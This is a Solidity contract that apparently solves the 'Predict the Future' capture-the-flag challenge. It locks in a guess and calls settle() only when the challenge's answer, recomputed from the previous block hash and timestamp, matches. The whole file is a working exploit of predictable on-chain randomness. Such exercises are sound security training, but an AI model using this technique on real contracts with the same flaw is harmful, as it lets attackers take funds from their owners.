// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

interface IPredictTheFutureChallenge {
    function lockInGuess(uint8 n) external payable;
    function settle() external;
    function isComplete() external view returns (bool);
}

contract PredictTheFutureSolver {
    IPredictTheFutureChallenge public challenge;
    uint8 public constant myGuess = 0;

    function PredictTheFutureSolver(address _challenge) public payable {
        challenge = IPredictTheFutureChallenge(_challenge);
        require(msg.value == 1 ether);
        challenge.lockInGuess.value(1 ether)(myGuess);
    }

    function attemptSettle() public {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        if (answer == myGuess) {
            challenge.settle();
        }
    }

    function() external payable {}
}
